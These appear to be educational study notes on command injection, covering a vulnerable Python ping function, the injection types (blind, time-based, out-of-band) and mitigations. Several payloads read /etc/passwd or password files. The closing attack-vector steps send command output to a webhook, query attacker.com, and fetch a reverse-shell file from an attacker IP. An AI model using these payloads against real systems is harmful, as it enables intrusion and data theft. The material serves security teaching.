### Overview
Command injection is a web application security vulnerability that allows an attacker to execute arbitrary system commands on the underlying operating system. It occurs when an application does not properly validate or sanitize user-supplied data before using it to construct system commands. Attackers can exploit this weakness to execute unintended commands, leading to unauthorized access, data exfiltration, server compromise, and other security risks.

Command injection vulnerabilities typically arise in web applications that take user input and directly use it to construct system commands. The most common attack vector is through web application forms or URL parameters, where user-supplied data is not sanitized or properly validated before being passed to the underlying system.

#### Features
1. **Identify a Vulnerable Input:** The attacker identifies a web application field (e.g., form input, URL parameter) that directly passes user-supplied data to a system command.
2. **Craft the Payload:** The attacker crafts a malicious payload that includes system commands to be executed by the server.
3. **Inject the Payload:** The attacker injects the crafted payload into the vulnerable input field.
4. **Command Execution:** The application, without proper validation, takes the injected payload and uses it to construct and execute a system command on the server.
5. **Exploitation:** The executed system command performs the intended action, such as accessing sensitive data, executing additional commands, or compromising the server.

#### Examples
- Suppose a web application has a form that allows users to ping an IP address to check its availability:
```html
<form action="/ping" method="GET">   <label for="ip_address">Enter IP Address:</label>   <input type="text" id="ip_address" name="ip_address">   <input type="submit" value="Ping"> </form>
```
- The application uses the user-supplied IP address directly in a system command to execute the ping:
```python
import subprocess
def ping(ip_address):
	cmd = "ping -c 4 " + ip_address
	result = subprocess.getoutput(cmd)
	return result
```
- If the application does not validate or sanitize the `ip_address` input properly, an attacker can inject a command as the IP address to execute arbitrary commands on the server: `127.0.0.1; ls -la`
- The resulting command executed on the server becomes: `ping -c 4 127.0.0.1; ls -la`
- The server will execute the `ls -la` command along with the ping, potentially listing the contents of the server's directory and exposing sensitive information.

#### Mitigation
- Use parameterized queries or prepared statements to separate user input from the command execution.
- Validate and sanitize user input to ensure it adheres to the expected format.
- Use application-specific whitelists for allowable inputs when constructing system commands.
- Limit the privileges of the server processes that execute the commands to minimize potential damage in case of a successful attack.

### Command Injection Types
#### Overview
1. **Basic Command Injection:** This is the most common type of command injection. It occurs when user-supplied data is directly concatenated with system commands without proper validation or sanitization.
```bash
# Original command to list files in a directory 
ls /path/to/directory  

# Command injection vulnerability 
user_input = "; cat /etc/passwd" 
ls /path/to/directory + user_input
```
2. **Blind Command Injection:** In blind command injection, the application does not display the command's output in the response. Attackers need to use techniques to infer the results indirectly, such as time delays or error messages.
```bash
# Original command to ping an IP address
ping 192.168.1.1

# Blind command injection vulnerability
user_input = "; sleep 10"
ping 192.168.1.1 + user_input
```
- The application may take longer to respond if the injected command is executed successfully.
3. **Time-Based Blind Command Injection:** Similar to blind command injection, but the attacker uses time delays to infer the success of the injected command.
```bash
# Original command to ping an IP address
ping 192.168.1.1

# Time-based blind command injection vulnerability 
user_input = "; sleep 10"
ping 192.168.1.1 + user_input
```
- The application may take 10 seconds longer to respond if the injected command is executed successfully.
4. **Out-of-Band Command Injection:** In this type, the attacker leverages other communication channels to interact with the injected command's results (e.g., DNS requests, HTTP requests).
```bash
# Original command to ping an IP address
ping 192.168.1.1

# Out-of-band command injection vulnerability
user_input = "; nslookup attacker.com"
ping 192.168.1.1 + user_input
```
+ The attacker's domain name server (DNS) may receive a request from the victim's server if the injected command is executed successfully.
5. **Platform-Specific Command Injection:** This type of injection targets specific operating systems or platforms, taking advantage of their unique features or vulnerabilities.
```powershell
# Original command to list files in a directory 
dir C:\path\to\directory  

# Windows-specific command injection vulnerability 
user_input = " & type C:\passwords.txt"
dir C:\path\to\directory + user_input
```
- The `type` command will display the contents of the specified file.

#### Blind Command Injection
##### Overview
Blind Command Injection is a type of command injection attack where the application is vulnerable to command injection, but the results of the injected command are not directly visible in the application's response. Unlike regular command injection, where the attacker can observe the output of the executed command, blind command injection requires the attacker to infer the success or failure of the injected command indirectly through the application's behavior.

Blind command injection attacks are typically encountered when the application executes the injected command but does not display the command's output on the web page or in the response. As a result, the attacker cannot directly observe the results of the injected command, making the attack more challenging.

There are two main types of blind command injection:

1. **Boolean-Based Blind Command Injection:** In this type of blind command injection, the attacker injects a command that results in a condition that is either true or false. The application's response may vary depending on whether the injected condition evaluates to true or false. The attacker then uses this variation in the application's behavior to infer whether the injected command was executed successfully.
```bash
ping 192.168.1.1; if [ -f /etc/passwd ]; then sleep 5; fi;
 ```
- If the injected file (`/etc/passwd`) exists on the server, the application will introduce a 5-second delay in the response. The attacker can infer that the file exists if the application's response takes 5 seconds longer.
    
2. **Time-Based Blind Command Injection:** In time-based blind command injection, the attacker injects a command that causes a time delay in the application's response. The attacker then measures the time it takes for the application to respond, which indirectly reveals whether the injected command was executed.
```bash
ping 192.168.1.1; sleep 10;
```
- If the injected command is executed, the application's response will be delayed by 10 seconds. The attacker can determine whether the command was executed based on the response time.

##### Attack Vector
1. **Find a parameter that is vulnerable to command injection**
2. **Try injection scripts**:
	```bash
	curl https://tcm-sec.com; whoami
	```
	- As long as the website returns a good response then the command is executed
3. **Connect it to a WebHook**:
	```bash
	https://webhook.site/d73c9ce0-01e0-46e9-b192-774161b3fcd9?`whoami`
	```
	- The result of the command will be shown in the request in the WebHook
4. **Connect Back to Python Server**:
	```bash
	python3 -m http.server 8080
	
	https://tcm-sec.com \n wget <Attacker_IP>:8080/reverse_shell.php
	```
	- The result of the command will reconnect back to the open python http server (reverse shell)
